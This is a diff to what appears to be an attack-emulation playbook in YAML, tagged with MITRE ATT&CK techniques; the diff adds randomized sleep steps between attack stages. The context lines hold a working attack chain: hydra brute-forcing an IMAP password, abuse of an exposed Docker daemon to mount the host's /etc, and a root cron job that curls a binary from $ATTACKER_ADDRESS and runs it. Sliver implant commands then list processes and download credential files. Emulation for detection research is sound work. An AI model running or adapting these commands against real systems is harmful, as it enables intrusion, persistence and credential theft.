@@ -18,6 +18,11 @@ commands:
       technique_name: "Gather Victim Identity Information: Email Addresses"
       description: "Enumerate email addresses on SMTP-Host"
 
+  - type: sleep
+    seconds: 30
+    min_sec: 5
+    random: true
+
   - type: shell
     cmd: hydra -l "alice@$DOMAIN" -P smtp-pass.txt -s 143 $SERVER_ADDRESS imap  
     metadata:
@@ -25,6 +30,11 @@ commands:
       tactics: "Initial Access"
       technique_name: "Valid Accounts: Local Accounts, Brute Force: Password Guessing, External Remote Services"
       description: "Brute-force IMAP-password using the already enumerated username"
+
+  - type: sleep
+    seconds: 30
+    min_sec: 5
+    random: true
 
   - type: http-client
     url: http://$SERVER_ADDRESS:8080
@@ -87,6 +97,11 @@ commands:
       tactics: "Discovery"
       description: "Attacker discovers user id"
 
+  - type: sleep
+    seconds: 30
+    min_sec: 5
+    random: true
+
   - type: msf-session
     session: "foothold"
     stdapi: True
@@ -101,12 +116,23 @@ commands:
       tactics: "Discovery"
       description: "Attacker asks docker-daemon for running containers"
 
+  - type: sleep
+    seconds: 30
+    min_sec: 5
+    random: true
+
+
   - type: shell
     cmd: docker -H tcp://localhost:1090 network list
     metadata:
       techniques: "T1016 "
       tactics: "Discovery"
       description: "Attacker discovers docker-networks using the exposed docker-daemon"
+
+  - type: sleep
+    seconds: 30
+    min_sec: 5
+    random: true
 
   - type: shell
     cmd: docker -H tcp://localhost:1090 run --rm -t -u root --network=nextcloud_default -v /etc:/root/etc  kalilinux/kali-rolling bash -c "echo \"*/5 * * * * root test -e /opt/tool || curl http://$ATTACKER_ADDRESS:8888/tool > /opt/tool && chmod +x /opt/tool && /opt/tool\" > /root/etc/cron.d/sysvz"
@@ -126,6 +152,11 @@ commands:
       technique_name: "File and Directory Discovery"
       description: "Use sliver to list files after container-escape"
 
+  - type: sleep
+    seconds: 30
+    min_sec: 5
+    random: true
+
   - type: sliver-session
     cmd: ps
     session: badimplant
@@ -137,6 +168,11 @@ commands:
 
   - type: mktemp
     variable: SHADOW
+
+  - type: sleep
+    seconds: 30
+    min_sec: 5
+    random: true
 
   - type: sliver-session
     cmd: download
